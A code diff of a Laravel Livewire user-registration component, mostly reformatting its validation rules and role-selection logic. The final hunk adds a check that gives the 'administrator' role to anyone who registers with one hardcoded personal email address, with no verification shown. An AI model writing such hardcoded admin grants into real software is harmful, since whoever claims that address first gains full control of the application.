@@ -17,14 +17,15 @@ new class extends Component
     #[Rule('required|email|unique:users,email')]
     public string $email = '';
 
-    #[Rule([
-        'required',
-        'min:8',
-        'regex:/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/'
-    ], message: [
-        'password.min' => 'Password must be at least 8 characters long.',
-        'password.regex' => 'Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character (@$!%*?&).'
-    ])]
+    #[Rule(
+        [
+            'required','min:8','regex:/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/'], 
+            message: [
+                'password.min' => 'Password must be at least 8 characters long.',
+                'password.regex' => 'Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character (@$!%*?&).'
+            ]
+        )
+    ]
     public string $password = '';
 
     #[Rule('required|same:password')]
@@ -45,7 +46,8 @@ new class extends Component
         // Default to "tenant" if parameter is null, empty, or invalid
         if (!empty($usertype) && in_array(strtolower($usertype), ['owner', 'tenant'])) {
             $this->role = strtolower($usertype);
-        } else {
+        } 
+        else {
             $this->role = 'tenant';
         }
     }
@@ -54,6 +56,11 @@ new class extends Component
     public function register(): void
     {
         $data = $this->validate();
+
+        // checek if the email is marnelle24@gmail.com
+        if ($data['email'] === 'marnelle24@gmail.com') {
+            $data['role'] = 'administrator';
+        }
         
         // Hash the password
         $data['password'] = Hash::make($data['password']);
